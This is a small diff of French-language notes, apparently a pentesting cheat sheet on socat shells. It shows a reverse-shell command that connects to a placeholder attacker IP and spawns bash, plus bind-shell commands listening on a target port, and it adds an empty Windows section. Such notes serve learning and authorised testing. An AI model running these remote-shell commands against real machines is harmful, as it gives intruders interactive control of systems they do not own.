@@ -37,5 +37,11 @@ user@raspberrypi: ~$ socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:"bash -li"
 1) Sur la machine cible sous linux :
 
 ```shell
-root@raspberrypi:/home/user# socat TCP-L:4433 EXEC:"bash -li"
+user@raspberrypi: ~$ socat TCP-L:<TARGET-PORT> EXEC:"bash -li"
+```
+
+2) Sur une machine Windows
+
+```shell
+
 ```
